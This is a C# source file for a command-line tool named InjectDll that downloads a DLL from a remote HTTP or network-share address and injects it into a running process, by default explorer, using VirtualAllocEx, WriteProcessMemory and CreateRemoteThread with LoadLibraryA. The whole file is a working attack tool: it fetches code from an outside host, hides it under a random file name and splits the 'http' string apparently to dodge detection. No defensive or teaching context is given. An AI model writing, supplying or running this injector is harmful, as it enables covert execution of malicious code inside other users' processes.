using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace InjectDll
{
    internal class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);


        static String generateLocalFileName (int length)
        {
            int numChars = 24;
            char firstChar = 'a';

            char[] chars = new char[numChars];

            for(int i=0; i<numChars; i++)
            {
                chars[i] = Convert.ToChar(Convert.ToInt32(firstChar) + i);
            }

            var resultChars = new char[length];
            var random = new Random();

            for (int i=0; i<resultChars.Length; i++)
            {
                resultChars[i] = chars[random.Next(chars.Length)];
            }

            String resultString = new String(resultChars) + ".dll";

            return resultString;
        }

        // returns local file path of the downloaded file
        static String downloadFile (String url)
        {
            String fileName = generateLocalFileName(4);

            String localFilePath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\" + fileName;

            WebClient webClient = new WebClient();
            webClient.DownloadFile(url, localFilePath);

            return localFilePath;
        }

        // Usage:
        // injectDll.exe http://192.168.10.11:8000/dllfile [notepad]
        // or
        // injectDll.exe \\192.168.10.11\Files\dllfile
        static void Main(string[] args)
        {

            if (args.Length == 0)
            {
                return;
            }

            String processPattern = "explorer";
            String remotePath = args[0];
            String localPath = null;

            if (args.Length > 1)
            {
                processPattern = args[1];
            }

            Process[] expProc = Process.GetProcessesByName(processPattern);
            int pid = expProc[0].Id;

            if (remotePath.ToLower().Contains("ht" + "tp"))
            {
                localPath = downloadFile(remotePath);
            }
            else
            {
                localPath = remotePath;
            }

            Console.WriteLine(localPath);
            Console.WriteLine(pid);

            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
            IntPtr outSize;
            Boolean res = WriteProcessMemory(hProcess, addr, Encoding.Default.GetBytes(localPath), localPath.Length, out outSize);
            IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);

            // Appear to break the injection
            //if (remotePath.ToLower().Contains("ht" + "tp"))
            //{
            //    System.IO.File.Delete(localPath);
            //}
        }
    }
}
